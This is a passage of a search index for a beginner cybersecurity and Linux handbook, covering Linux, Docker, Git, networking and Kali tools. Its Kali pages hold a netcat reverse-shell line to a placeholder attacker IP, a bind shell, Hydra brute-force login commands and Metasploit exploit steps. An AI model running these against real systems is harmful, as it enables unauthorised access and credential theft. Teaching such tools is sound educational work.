{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"TCP Handbook","text":""},{"location":"#welcome-to-tc-pioneer","title":"Welcome to TC Pioneer","text":"<p>TC Pioneer is a cybersecurity and Linux learning platform focused on building practical skills through structured learning and real-world concepts. This handbook serves as a centralized knowledge base for students, developers, and security enthusiasts who want to understand systems deeply and apply their knowledge effectively.</p>"},{"location":"#what-you-will-learn","title":"What You Will Learn","text":""},{"location":"#linux-fundamentals","title":"Linux Fundamentals","text":"<p>Learn how operating systems work from the ground up. This section covers essential concepts such as file systems, permissions, and command-line usage to build a strong foundation in Linux.</p>"},{"location":"#cybersecurity-concepts","title":"Cybersecurity Concepts","text":"<p>Understand core security principles including reconnaissance, attack methodologies, and defensive strategies. The content is designed to help you think like both an attacker and a defender.</p>"},{"location":"#security-tools","title":"Security Tools","text":"<p>Explore widely used tools in the cybersecurity ecosystem such as Nmap, Burp Suite, and Wireshark. Learn how these tools are used in real-world scenarios.</p>"},{"location":"#why-tc-pioneer","title":"Why TC Pioneer","text":"<ul> <li>Focus on practical, real-world knowledge</li> <li>Structured learning paths for beginners and advanced learners</li> <li>Clean and minimal documentation for better understanding</li> <li>Designed for students, developers, and aspiring security professionals</li> </ul>"},{"location":"#learning-approach","title":"Learning Approach","text":"<p>TC Pioneer emphasizes clarity and hands-on understanding. Instead of overwhelming theory, each topic is broken down into simple, actionable concepts that can be applied immediately.</p>"},{"location":"#get-started","title":"Get Started","text":"<ul> <li>Start with the Linux section to build a strong foundation</li> <li>Move into cybersecurity topics to understand attack and defense</li> <li>Explore tools to gain practical experience</li> </ul>"},{"location":"#community-and-platform","title":"Community and Platform","text":"<p>TC Pioneer is more than just documentation. It is a growing learning ecosystem where individuals can explore, practice, and improve their technical skills.</p> <p>Visit the main platform for more resources and updates.</p>"},{"location":"#conclusion","title":"Conclusion","text":"<p>This handbook is designed to guide you through essential concepts in Linux and cybersecurity. Whether you are just starting or looking to deepen your knowledge, TC Pioneer provides a structured path to help you grow.</p>"},{"location":"docker/advanced/","title":"Advanced Concepts","text":""},{"location":"docker/advanced/#dockerfile","title":"Dockerfile","text":"<ul> <li>file used to build docker images</li> </ul> <p>example:</p> <p>FROM ubuntu RUN apt update CMD [\"echo\", \"hello\"]</p>"},{"location":"docker/advanced/#volumes","title":"Volumes","text":"<ul> <li>used to store data permanently</li> <li>data is not lost when container stops</li> </ul>"},{"location":"docker/advanced/#networks","title":"Networks","text":"<ul> <li>used for communication between containers</li> </ul>"},{"location":"docker/advanced/#port-mapping","title":"Port Mapping","text":"<ul> <li>connect container port to host</li> </ul> <pre><code>docker run -p 8080:80 &lt;image-name&gt;\n</code></pre>"},{"location":"docker/advanced/#logs","title":"Logs","text":"<pre><code>docker logs &lt;container-id&gt;\n</code></pre>"},{"location":"docker/advanced/#restart-container","title":"Restart Container","text":"<pre><code>docker restart &lt;container-id&gt;\n</code></pre>"},{"location":"docker/advanced/#remove-all-containers","title":"Remove All Containers","text":"<pre><code>docker rm $(docker ps -aq)\n</code></pre>"},{"location":"docker/advanced/#remove-all-images","title":"Remove All Images","text":"<pre><code>docker rmi $(docker images -q)\n</code></pre>"},{"location":"docker/advanced/#simple-flow","title":"Simple Flow","text":"<ol> <li>pull image</li> <li>run container</li> <li>make changes</li> <li>build image</li> <li>push to docker hub</li> </ol>"},{"location":"docker/commands/","title":"Basic Docker Commands","text":""},{"location":"docker/commands/#pull-image","title":"Pull Image","text":"<pre><code>docker pull &lt;image-name&gt;\n</code></pre>"},{"location":"docker/commands/#run-container","title":"Run Container","text":"<pre><code>docker run &lt;image-name&gt;\n</code></pre>"},{"location":"docker/commands/#list-containers","title":"List Containers","text":"<pre><code>docker ps\n</code></pre> <pre><code>docker ps -a\n</code></pre>"},{"location":"docker/commands/#stop-container","title":"Stop Container","text":"<pre><code>docker stop &lt;container-id&gt;\n</code></pre>"},{"location":"docker/commands/#remove-container","title":"Remove Container","text":"<pre><code>docker rm &lt;container-id&gt;\n</code></pre>"},{"location":"docker/commands/#remove-image","title":"Remove Image","text":"<pre><code>docker rmi &lt;image-id&gt;\n</code></pre>"},{"location":"docker/commands/#execute-command-in-container","title":"Execute Command in Container","text":"<pre><code>docker exec -it &lt;container-id&gt; bash\n</code></pre>"},{"location":"docker/images-containers/","title":"Images and Containers","text":""},{"location":"docker/images-containers/#images","title":"Images","text":"<ul> <li>blueprint of container</li> <li>stored in Docker Hub</li> </ul>"},{"location":"docker/images-containers/#containers","title":"Containers","text":"<ul> <li>running instance of image</li> <li>isolated environment</li> </ul>"},{"location":"docker/images-containers/#build-image","title":"Build Image","text":"<pre><code>docker build -t &lt;image-name&gt; .\n</code></pre>"},{"location":"docker/images-containers/#docker-hub","title":"Docker Hub","text":"<ul> <li>public repository for docker images</li> <li>used to pull and push images</li> </ul>"},{"location":"docker/images-containers/#tag-image","title":"Tag Image","text":"<pre><code>docker tag &lt;image-id&gt; &lt;username/image-name&gt;\n</code></pre>"},{"location":"docker/images-containers/#push-image","title":"Push Image","text":"<pre><code>docker push &lt;username/image-name&gt;\n</code></pre>"},{"location":"docker/intro/","title":"Docker","text":""},{"location":"docker/intro/#what-is-docker","title":"What is Docker","text":"<ul> <li>Docker is a tool used to create, run, and manage applications in containers</li> <li>It helps to run applications in isolated environments</li> </ul>"},{"location":"docker/intro/#why-docker","title":"Why Docker","text":"<ul> <li>works on any system</li> <li>lightweight compared to virtual machines</li> <li>fast deployment</li> <li>easy to scale</li> </ul>"},{"location":"docker/intro/#docker-vs-virtual-machine","title":"Docker vs Virtual Machine","text":"<ul> <li>Docker:</li> <li>uses containers</li> <li>lightweight</li> <li> <p>shares host OS</p> </li> <li> <p>Virtual Machine:</p> </li> <li>uses full OS</li> <li>heavy</li> <li>slower</li> </ul> <p>simple: Docker = lightweight container VM = full system</p>"},{"location":"docker/intro/#container","title":"Container","text":"<ul> <li>container is a running instance of an image</li> <li>it contains everything needed to run the application</li> </ul>"},{"location":"docker/intro/#image","title":"Image","text":"<ul> <li>image is a blueprint of a container</li> <li>used to create containers</li> </ul>"},{"location":"docker/setup/","title":"Setup and Installation","text":""},{"location":"docker/setup/#install-docker","title":"Install Docker","text":"<ul> <li>Windows: Docker Desktop  </li> <li>Mac: Docker Desktop  </li> <li>Linux: apt install docker.io  </li> </ul>"},{"location":"docker/setup/#check-version","title":"Check Version","text":""},{"location":"docker/setup/#docker-version","title":"<pre><code>docker --version  \n</code></pre>","text":""},{"location":"docker/setup/#check-docker-status","title":"Check Docker Status","text":""},{"location":"docker/setup/#docker-info","title":"<pre><code>docker info  \n</code></pre>","text":""},{"location":"docker/setup/#run-test-container","title":"Run Test Container","text":"<pre><code>docker run hello-world  \n</code></pre>"},{"location":"github/advanced/","title":"Advanced Concepts","text":""},{"location":"github/advanced/#init-command","title":"Init Command","text":"<p>init \u2192 used to create a new git repo</p> <pre><code>git init\ngit remote add origin &lt;link&gt;\ngit remote -v\ngit branch\ngit branch -M main\ngit push origin main\n</code></pre>"},{"location":"github/advanced/#workflow","title":"Workflow","text":"<p>working directory \u2192 staging area \u2192 local repo \u2192 remote repo</p>"},{"location":"github/advanced/#undoing-changes","title":"Undoing Changes","text":"<p>case 1: staged changes</p> <pre><code>git reset &lt;file name&gt;\ngit reset\n</code></pre> <p>case 2: committed changes (one commit)</p> <pre><code>git reset HEAD~1\n</code></pre> <p>case 3: committed changes (many commits)</p> <pre><code>git reset &lt;commit hash&gt;\ngit reset --hard &lt;commit hash&gt;\n</code></pre>"},{"location":"github/advanced/#logs","title":"Logs","text":"<p>git log log = history</p>"},{"location":"github/advanced/#fork","title":"Fork","text":"<p>A fork is a new repo that shares code with the original repo</p> <p>Fork is a rough copy</p>"},{"location":"github/advanced/#extra-concepts","title":"Extra Concepts","text":""},{"location":"github/advanced/#gitignore","title":".gitignore","text":"<p>used to ignore files (node_modules, .env)</p>"},{"location":"github/advanced/#staging-area","title":"Staging Area","text":"<p>middle step between working directory and commit</p>"},{"location":"github/advanced/#head","title":"HEAD","text":"<p>pointer to current commit</p>"},{"location":"github/advanced/#origin","title":"Origin","text":"<p>default name of remote repo</p>"},{"location":"github/advanced/#main-vs-master","title":"Main vs Master","text":"<p>main \u2192 new default master \u2192 old naming</p>"},{"location":"github/advanced/#simple-flow","title":"Simple Flow","text":"<ol> <li>create file</li> <li>git add</li> <li>git commit</li> <li>git push</li> </ol>"},{"location":"github/branching/","title":"Branching and Merging","text":""},{"location":"github/branching/#git-branches","title":"Git Branches","text":"<pre><code>git branch (to check branch)\ngit branch -M main (to rename branch)\ngit checkout &lt;branch name&gt; (to navigate)\ngit checkout -b &lt;new branch name&gt; (to create new branch)\ngit branch -d &lt;branch name&gt; (to delete branch)\n</code></pre>"},{"location":"github/branching/#merging-code","title":"Merging Code","text":"<p>Way 1:</p> <pre><code>git diff &lt;branch name&gt;\n</code></pre> <pre><code>git merge &lt;branch name&gt;\n</code></pre> <p>Way 2:</p> <p>create a PR (Pull Request)</p>"},{"location":"github/branching/#pull-request","title":"Pull Request","text":"<p>it lets you tell others about changes you\u2019ve published to a branch in a repo on GitHub</p>"},{"location":"github/branching/#resolving-merge-conflicts","title":"Resolving Merge Conflicts","text":"<p>An event when git is unable to automatically resolve differences in code between two commits</p>"},{"location":"github/commands/","title":"Basic Git Commands","text":""},{"location":"github/commands/#clone-and-status","title":"Clone and Status","text":"<p>clone \u2192 cloning a repo on our local machine</p> <pre><code>git clone &lt;link&gt;\n</code></pre> <p>status \u2192 display the state of the code</p> <pre><code>git status\n</code></pre>"},{"location":"github/commands/#basic-commands","title":"Basic Commands","text":"<p>change directory</p> <pre><code>cd\n</code></pre> <p>list files</p> <pre><code>ls\n</code></pre> <p>hidden files</p> <pre><code>ls -a\n</code></pre>"},{"location":"github/commands/#status-types","title":"Status Types","text":"<ul> <li>untracked \u2192 new file that git doesn\u2019t yet track</li> <li>modified \u2192 changed</li> <li>staged \u2192 file is ready to be committed</li> <li>unmodified \u2192 unchanged</li> </ul>"},{"location":"github/commands/#add-and-commit","title":"Add and Commit","text":"<p>add \u2192 adds new or changed files to staging area</p> <pre><code>git add &lt;file name&gt;\n</code></pre> <p>commit \u2192 record of change</p> <pre><code>git commit -m \"some message\"\n</code></pre>"},{"location":"github/commands/#push-command","title":"Push Command","text":"<p>push \u2192 upload local repo content to remote repo</p> <pre><code>git push origin main\n</code></pre> <p>push = local \u2192 remote</p>"},{"location":"github/commands/#pull-command","title":"Pull Command","text":"<p>used to fetch and download content from remote repo</p> <pre><code>git pull origin main\n</code></pre>"},{"location":"github/intro/","title":"Git and GitHub","text":""},{"location":"github/intro/#git","title":"GIT","text":"<ul> <li>Version control system is a tool that helps to track changes in the code  </li> <li>Git is a version control system. It is:</li> <li>popular  </li> <li>free &amp; open-source  </li> <li>fast &amp; scalable  </li> </ul> <p>(1) track the history (2) collaborate  </p>"},{"location":"github/intro/#github-githubcom","title":"GitHub (github.com)","text":"<ul> <li>Website that allows developers to store and manage their code using git  </li> <li>(in the form of folders) \u2192 Repository  </li> </ul>"},{"location":"github/intro/#difference-between-git-and-github","title":"Difference between Git and GitHub","text":"<ul> <li>Git:</li> <li>tool/software  </li> <li>works locally  </li> <li> <p>used to track changes  </p> </li> <li> <p>GitHub:</p> </li> <li>cloud platform  </li> <li>works online  </li> <li>used to store and share code  </li> </ul> <p>simple: Git = tool GitHub = place to store code  </p>"},{"location":"github/intro/#changes","title":"Changes","text":"<p>changes \u2192 commit = changes are final  </p>"},{"location":"github/setup/","title":"Setup and Configuration","text":""},{"location":"github/setup/#setting-up-git","title":"Setting up Git","text":"<ul> <li>Visual Studio Code</li> <li>Windows (Git Bash)</li> <li>Mac (Terminal)</li> </ul>"},{"location":"github/setup/#check-git-version","title":"Check Git Version","text":"<pre><code>git --version\n</code></pre>"},{"location":"github/setup/#configuring-git","title":"Configuring Git","text":"<pre><code>git config --global user.name \"my name\"\ngit config --global user.email \"demo@gmail.com\"\ngit config --list\n</code></pre>"},{"location":"kali/burp/","title":"Burp Suite","text":""},{"location":"kali/burp/#what-is-burp-suite","title":"What is Burp Suite","text":"<ul> <li>Burp Suite is a web application security testing tool  </li> <li>used to intercept and modify HTTP/HTTPS requests  </li> <li>widely used in web security and CTF  </li> </ul>"},{"location":"kali/burp/#start-burp-suite","title":"Start Burp Suite","text":"<pre><code>burpsuite\n</code></pre>"},{"location":"kali/burp/#setup-proxy","title":"Setup Proxy","text":"<ul> <li>set browser proxy to 127.0.0.1:8080  </li> <li>open browser through Burp  </li> </ul>"},{"location":"kali/burp/#intercept-request","title":"Intercept Request","text":"<ul> <li>turn intercept on  </li> <li>capture request from browser  </li> </ul>"},{"location":"kali/burp/#send-to-repeater","title":"Send to Repeater","text":"<ul> <li>right click request  </li> <li>send to repeater  </li> </ul>"},{"location":"kali/burp/#send-to-intruder","title":"Send to Intruder","text":"<ul> <li>right click request  </li> <li>send to intruder  </li> </ul>"},{"location":"kali/burp/#use-case","title":"Use Case","text":"<ul> <li>test web applications  </li> <li>modify requests  </li> <li>find vulnerabilities  </li> </ul>"},{"location":"kali/hydra/","title":"Hydra","text":""},{"location":"kali/hydra/#what-is-hydra","title":"What is Hydra","text":"<ul> <li>Hydra is a password cracking tool  </li> <li>used for brute force attacks  </li> <li>supports multiple protocols  </li> </ul>"},{"location":"kali/hydra/#basic-syntax","title":"Basic Syntax","text":"<pre><code>hydra -l &lt;user&gt; -P &lt;wordlist&gt; &lt;target&gt; &lt;service&gt;\n</code></pre>"},{"location":"kali/hydra/#ssh-example","title":"SSH Example","text":"<pre><code>hydra -l admin -P rockyou.txt ssh://&lt;target&gt;\n</code></pre>"},{"location":"kali/hydra/#ftp-example","title":"FTP Example","text":"<pre><code>hydra -l admin -P rockyou.txt ftp://&lt;target&gt;\n</code></pre>"},{"location":"kali/hydra/#http-login-example","title":"HTTP Login Example","text":"<pre><code>hydra -l admin -P rockyou.txt &lt;target&gt; http-post-form\n</code></pre>"},{"location":"kali/hydra/#rdp-example","title":"RDP Example","text":"<pre><code>hydra -l admin -P rockyou.txt rdp://&lt;target&gt;\n</code></pre>"},{"location":"kali/hydra/#use-username-list","title":"Use Username List","text":"<pre><code>hydra -L users.txt -P rockyou.txt ssh://&lt;target&gt;\n</code></pre>"},{"location":"kali/hydra/#use-password-list","title":"Use Password List","text":"<pre><code>hydra -l admin -P passwords.txt ssh://&lt;target&gt;\n</code></pre>"},{"location":"kali/hydra/#stop-after-first-found","title":"Stop After First Found","text":"<pre><code>hydra -f -l admin -P rockyou.txt ssh://&lt;target&gt;\n</code></pre>"},{"location":"kali/hydra/#verbose-output","title":"Verbose Output","text":"<pre><code>hydra -V -l admin -P rockyou.txt ssh://&lt;target&gt;\n</code></pre>"},{"location":"kali/hydra/#specify-port","title":"Specify Port","text":"<pre><code>hydra -l admin -P rockyou.txt -s 22 &lt;target&gt; ssh\n</code></pre>"},{"location":"kali/hydra/#use-case","title":"Use Case","text":"<ul> <li>brute force login  </li> <li>test weak passwords  </li> <li>used in CTF and penetration testing  </li> </ul>"},{"location":"kali/hydra/#simple-flow","title":"Simple Flow","text":"<ol> <li>find service (using nmap)  </li> <li>choose wordlist  </li> <li>run hydra  </li> <li>get credentials  </li> </ol>"},{"location":"kali/metasploit/","title":"Metasploit","text":""},{"location":"kali/metasploit/#what-is-metasploit","title":"What is Metasploit","text":"<ul> <li>Metasploit is an exploitation framework  </li> <li>used to find and exploit vulnerabilities  </li> <li>widely used in penetration testing  </li> </ul>"},{"location":"kali/metasploit/#start-metasploit","title":"Start Metasploit","text":"<pre><code>msfconsole\n</code></pre>"},{"location":"kali/metasploit/#search-module","title":"Search Module","text":"<pre><code>search &lt;keyword&gt;\n</code></pre>"},{"location":"kali/metasploit/#use-module","title":"Use Module","text":"<pre><code>use &lt;module&gt;\n</code></pre>"},{"location":"kali/metasploit/#show-options","title":"Show Options","text":"<pre><code>show options\n</code></pre>"},{"location":"kali/metasploit/#set-target","title":"Set Target","text":"<pre><code>set RHOST &lt;target&gt;\n</code></pre>"},{"location":"kali/metasploit/#set-port","title":"Set Port","text":"<pre><code>set RPORT &lt;port&gt;\n</code></pre>"},{"location":"kali/metasploit/#set-payload","title":"Set Payload","text":"<pre><code>set PAYLOAD &lt;payload&gt;\n</code></pre>"},{"location":"kali/metasploit/#run-exploit","title":"Run Exploit","text":"<pre><code>run\n</code></pre>"},{"location":"kali/metasploit/#background-session","title":"Background Session","text":"<pre><code>background\n</code></pre>"},{"location":"kali/metasploit/#show-sessions","title":"Show Sessions","text":"<pre><code>sessions\n</code></pre>"},{"location":"kali/metasploit/#interact-with-session","title":"Interact with Session","text":"<pre><code>sessions -i &lt;id&gt;\n</code></pre>"},{"location":"kali/metasploit/#use-case","title":"Use Case","text":"<ul> <li>exploit vulnerabilities  </li> <li>gain access  </li> <li>post exploitation  </li> </ul>"},{"location":"kali/netcat/","title":"Netcat","text":""},{"location":"kali/netcat/#what-is-netcat","title":"What is Netcat","text":"<ul> <li>Netcat is a networking tool  </li> <li>used for reading and writing data over network  </li> <li>also called \"Swiss army knife\" of networking  </li> </ul>"},{"location":"kali/netcat/#connect-to-port","title":"Connect to Port","text":"<pre><code>nc &lt;target&gt; &lt;port&gt;\n</code></pre>"},{"location":"kali/netcat/#listen-on-port","title":"Listen on Port","text":"<pre><code>nc -lvp &lt;port&gt;\n</code></pre>"},{"location":"kali/netcat/#chat-between-systems","title":"Chat Between Systems","text":"<p>listener:</p> <pre><code>nc -lvp 1234\n</code></pre> <p>sender:</p> <pre><code>nc &lt;target&gt; 1234\n</code></pre>"},{"location":"kali/netcat/#file-transfer","title":"File Transfer","text":"<p>sender:</p> <pre><code>nc -lvp 1234 &lt; file.txt\n</code></pre> <p>receiver:</p> <pre><code>nc &lt;target&gt; 1234 &gt; file.txt\n</code></pre>"},{"location":"kali/netcat/#reverse-shell","title":"Reverse Shell","text":"<pre><code>nc -e /bin/bash &lt;attacker-ip&gt; &lt;port&gt;\n</code></pre>"},{"location":"kali/netcat/#bind-shell","title":"Bind Shell","text":"<pre><code>nc -lvp &lt;port&gt; -e /bin/bash\n</code></pre>"},{"location":"kali/netcat/#banner-grabbing","title":"Banner Grabbing","text":"<pre><code>nc &lt;target&gt; 80\n</code></pre>"},{"location":"kali/netcat/#use-case","title":"Use Case","text":"<ul> <li>debugging network  </li> <li>file transfer  </li> <li>reverse shell  </li> <li>basic exploitation  </li> </ul>"},{"location":"kali/nmap/","title":"Nmap","text":""},{"location":"kali/nmap/#what-is-nmap","title":"What is Nmap","text":"<ul> <li>Nmap is a network scanning tool  </li> <li>used to discover hosts and services  </li> <li>widely used in cybersecurity and CTF  </li> </ul>"},{"location":"kali/nmap/#basic-scan","title":"Basic Scan","text":"<pre><code>nmap &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#scan-with-service-detection","title":"Scan with Service Detection","text":"<pre><code>nmap -sV &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#scan-all-ports","title":"Scan All Ports","text":"<pre><code>nmap -p- &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#os-detection","title":"OS Detection","text":"<pre><code>nmap -O &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#aggressive-scan","title":"Aggressive Scan","text":"<pre><code>nmap -A &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#fast-scan","title":"Fast Scan","text":"<pre><code>nmap -F &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#scan-specific-ports","title":"Scan Specific Ports","text":"<pre><code>nmap -p 80,443 &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#scan-a-range-of-ips","title":"Scan a Range of IPs","text":"<pre><code>nmap 192.168.1.1-100\n</code></pre>"},{"location":"kali/nmap/#scan-a-subnet","title":"Scan a Subnet","text":"<pre><code>nmap 192.168.1.0/24\n</code></pre>"},{"location":"kali/nmap/#disable-ping","title":"Disable Ping","text":"<pre><code>nmap -Pn &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#syn-scan","title":"SYN Scan","text":"<pre><code>sudo nmap -sS &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#udp-scan","title":"UDP Scan","text":"<pre><code>sudo nmap -sU &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#save-output","title":"Save Output","text":"<pre><code>nmap -oN result.txt &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#xml-output","title":"XML Output","text":"<pre><code>nmap -oX result.xml &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#timing","title":"Timing","text":"<pre><code>nmap -T4 &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#verbose","title":"Verbose","text":"<pre><code>nmap -v &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#combine-options","title":"Combine Options","text":"<pre><code>nmap -A -T4 -p- &lt;target&gt;\n</code></pre>"},{"location":"kali/nmap/#use-case","title":"Use Case","text":"<ul> <li>find open ports  </li> <li>identify services  </li> <li>reconnaissance  </li> </ul>"},{"location":"kali/nmap/#simple-flow","title":"Simple Flow","text":"<ol> <li>scan target  </li> <li>find ports  </li> <li>identify services  </li> </ol>"},{"location":"kali/wireshark/","title":"Wireshark","text":""},{"location":"kali/wireshark/#what-is-wireshark","title":"What is Wireshark","text":"<ul> <li>Wireshark is a network packet analyzer  </li> <li>used to capture and inspect network traffic  </li> <li>widely used in debugging, analysis, and CTF  </li> </ul>"},{"location":"kali/wireshark/#start-wireshark","title":"Start Wireshark","text":"<pre><code>wireshark\n</code></pre>"},{"location":"kali/wireshark/#capture-packets","title":"Capture Packets","text":"<ul> <li>select network interface  </li> <li>click start capture  </li> </ul>"},{"location":"kali/wireshark/#stop-capture","title":"Stop Capture","text":"<ul> <li>click stop button  </li> </ul>"},{"location":"kali/wireshark/#common-filters","title":"Common Filters","text":"<p>HTTP traffic:</p> <pre><code>http\n</code></pre> <p>TCP traffic:</p> <pre><code>tcp\n</code></pre> <p>Specific IP:</p> <pre><code>ip.addr == &lt;target&gt;\n</code></pre> <p>Specific Port:</p> <pre><code>tcp.port == 80\n</code></pre>"},{"location":"kali/wireshark/#follow-tcp-stream","title":"Follow TCP Stream","text":"<ul> <li>right click on packet  </li> <li>follow \u2192 TCP stream  </li> </ul>"},{"location":"kali/wireshark/#search-in-packets","title":"Search in Packets","text":"<ul> <li>press Ctrl + F  </li> <li>search string or value  </li> </ul>"},{"location":"kali/wireshark/#export-files","title":"Export Files","text":"<ul> <li>File \u2192 Export Objects  </li> <li>choose HTTP / SMB  </li> </ul>"},{"location":"kali/wireshark/#save-capture","title":"Save Capture","text":"<pre><code>File \u2192 Save As\n</code></pre>"},{"location":"kali/wireshark/#use-case","title":"Use Case","text":"<ul> <li>analyze network traffic  </li> <li>capture credentials  </li> <li>debug applications  </li> <li>investigate attacks  </li> </ul>"},{"location":"kali/wireshark/#simple-flow","title":"Simple Flow","text":"<ol> <li>start capture  </li> <li>apply filters  </li> <li>analyze packets  </li> <li>extract data  </li> </ol>"},{"location":"linux/advanced/","title":"Advanced Concepts","text":""},{"location":"linux/advanced/#package-management","title":"Package Management","text":"<pre><code>apt update\napt upgrade\napt install &lt;package&gt;\n</code></pre>"},{"location":"linux/advanced/#processes","title":"Processes","text":"<pre><code>ps \u2192 list processes\ntop \u2192 real-time processes\nkill &lt;pid&gt; \u2192 stop process\n</code></pre>"},{"location":"linux/advanced/#networking","title":"Networking","text":"<pre><code>ifconfig\nip a\nping google.com\n</code></pre>"},{"location":"linux/advanced/#users","title":"Users","text":"<pre><code>adduser username\npasswd username\n</code></pre>"},{"location":"linux/advanced/#sudo","title":"Sudo","text":"<pre><code>sudo \u2192 run as root\n</code></pre>"},{"location":"linux/advanced/#logs","title":"Logs","text":"<pre><code>/var/log\n</code></pre>"},{"location":"linux/advanced/#environment-variables","title":"Environment Variables","text":"<pre><code>echo $PATH\n</code></pre>"},{"location":"linux/advanced/#simple-flow","title":"Simple Flow","text":"<ol> <li>navigate directories</li> <li>manage files</li> <li>install packages</li> <li>manage processes</li> <li>configure system</li> </ol>"},{"location":"linux/commands/","title":"Basic Linux Commands","text":""},{"location":"linux/commands/#navigation","title":"Navigation","text":"<pre><code>cd \u2192 change directory\ncd .. \u2192 go back\npwd \u2192 present working directory\n</code></pre>"},{"location":"linux/commands/#list-files","title":"List Files","text":"<pre><code>ls \u2192 list files\nls -l \u2192 detailed list\nls -a \u2192 hidden files\n</code></pre>"},{"location":"linux/commands/#file-operations","title":"File Operations","text":"<pre><code>touch file.txt \u2192 create file\nmkdir folder \u2192 create directory\nrm file.txt \u2192 remove file\nrm -r folder \u2192 remove directory\n</code></pre>"},{"location":"linux/commands/#copy-and-move","title":"Copy and Move","text":"<pre><code>cp file1 file2 \u2192 copy\nmv file1 file2 \u2192 move/rename\n</code></pre>"},{"location":"linux/commands/#view-files","title":"View Files","text":"<pre><code>cat file.txt \u2192 view content\nless file.txt \u2192 scroll view\nhead file.txt \u2192 first lines\ntail file.txt \u2192 last lines\n</code></pre>"},{"location":"linux/commands/#search","title":"Search","text":"<pre><code>grep \"text\" file.txt\n</code></pre>"},{"location":"linux/commands/#clear-terminal","title":"Clear Terminal","text":"<pre><code>clear\n</code></pre>"},{"location":"linux/filesystem/","title":"File System and Permissions","text":""},{"location":"linux/filesystem/#linux-file-system","title":"Linux File System","text":"<ul> <li>/ \u2192 root directory  </li> <li>/home \u2192 user files  </li> <li>/etc \u2192 configuration files  </li> <li>/var \u2192 logs and data  </li> <li>/bin \u2192 system binaries  </li> </ul>"},{"location":"linux/filesystem/#file-permissions","title":"File Permissions","text":"<p>r \u2192 read w \u2192 write x \u2192 execute  </p>"},{"location":"linux/filesystem/#permission-format","title":"Permission Format","text":"<p>-rwxr-xr--  </p> <ul> <li>first part \u2192 file type  </li> <li>next 3 \u2192 owner  </li> <li>next 3 \u2192 group  </li> <li>last 3 \u2192 others  </li> </ul>"},{"location":"linux/filesystem/#change-permissions","title":"Change Permissions","text":"<p>chmod 755 file  </p>"},{"location":"linux/filesystem/#change-ownership","title":"Change Ownership","text":"<p>chown user file  </p>"},{"location":"linux/intro/","title":"Linux","text":""},{"location":"linux/intro/#what-is-linux","title":"What is Linux","text":"<ul> <li>Linux is an open-source operating system  </li> <li>used to manage hardware and software  </li> <li>widely used in servers, cybersecurity, and development  </li> </ul>"},{"location":"linux/intro/#why-linux","title":"Why Linux","text":"<ul> <li>free and open-source  </li> <li>secure  </li> <li>stable  </li> <li>highly customizable  </li> <li>widely used in hacking and cybersecurity  </li> </ul>"},{"location":"linux/intro/#linux-distributions","title":"Linux Distributions","text":"<ul> <li>Ubuntu  </li> <li>Kali Linux  </li> <li>Debian  </li> <li>Fedora  </li> </ul>"},{"location":"linux/intro/#where-linux-is-used","title":"Where Linux is Used","text":"<ul> <li>servers  </li> <li>cloud systems  </li> <li>cybersecurity  </li> <li>embedded systems  </li> </ul>"},{"location":"linux/intro/#kernel","title":"Kernel","text":"<ul> <li>core part of the operating system  </li> <li>manages hardware and system resources  </li> </ul>"},{"location":"linux/setup/","title":"Setup and Access","text":""},{"location":"linux/setup/#install-linux","title":"Install Linux","text":"<ul> <li>dual boot with Windows</li> <li>virtual machine (VirtualBox / VMware)</li> <li>live USB</li> </ul>"},{"location":"linux/setup/#access-linux","title":"Access Linux","text":"<ul> <li>terminal (CLI)</li> <li>SSH (remote access)</li> </ul>"},{"location":"linux/setup/#check-system-info","title":"Check System Info","text":"<pre><code>uname -a\n</code></pre>"},{"location":"linux/setup/#check-current-user","title":"Check Current User","text":"<pre><code>whoami\n</code></pre>"},{"location":"linux/setup/#check-current-directory","title":"Check Current Directory","text":"<pre><code>pwd\n</code></pre>"},{"location":"networking/commands/","title":"Networking Commands","text":""},{"location":"networking/commands/#check-ip","title":"Check IP","text":"<pre><code>ip a\n</code></pre>"},{"location":"networking/commands/#ping","title":"Ping","text":"<pre><code>ping google.com\n</code></pre>"},{"location":"networking/commands/#traceroute","title":"Traceroute","text":"<pre><code>traceroute google.com\n</code></pre>"},{"location":"networking/commands/#dns-lookup","title":"DNS Lookup","text":"<pre><code>nslookup google.com\n</code></pre>"},{"location":"networking/commands/#netstat","title":"Netstat","text":"<pre><code>netstat -tuln\n</code></pre>"},{"location":"networking/commands/#curl","title":"Curl","text":"<pre><code>curl http://example.com\n</code></pre>"},{"location":"networking/commands/#use-case","title":"Use Case","text":"<ul> <li>troubleshoot network</li> <li>check connectivity</li> <li>analyze traffic</li> </ul>"},{"location":"networking/intro/","title":"Networking","text":""},{"location":"networking/intro/#what-is-networking","title":"What is Networking","text":"<ul> <li>Networking is the process of connecting devices to share data  </li> <li>allows communication between systems  </li> <li>used in internet, local networks, and cloud  </li> </ul>"},{"location":"networking/intro/#types-of-network","title":"Types of Network","text":"<ul> <li>LAN \u2192 Local Area Network  </li> <li>WAN \u2192 Wide Area Network  </li> <li>MAN \u2192 Metropolitan Area Network  </li> </ul>"},{"location":"networking/intro/#basic-components","title":"Basic Components","text":"<ul> <li>router  </li> <li>switch  </li> <li>firewall  </li> <li>server  </li> <li>client  </li> </ul>"},{"location":"networking/intro/#data-transmission","title":"Data Transmission","text":"<ul> <li>data is sent in the form of packets  </li> <li>each packet travels through network  </li> </ul>"},{"location":"networking/intro/#use-case","title":"Use Case","text":"<ul> <li>internet communication  </li> <li>file sharing  </li> <li>remote access  </li> </ul>"},{"location":"networking/ip/","title":"IP Addressing","text":""},{"location":"networking/ip/#what-is-ip-address","title":"What is IP Address","text":"<ul> <li>unique identifier for a device on network  </li> <li>used to identify source and destination  </li> </ul>"},{"location":"networking/ip/#types-of-ip","title":"Types of 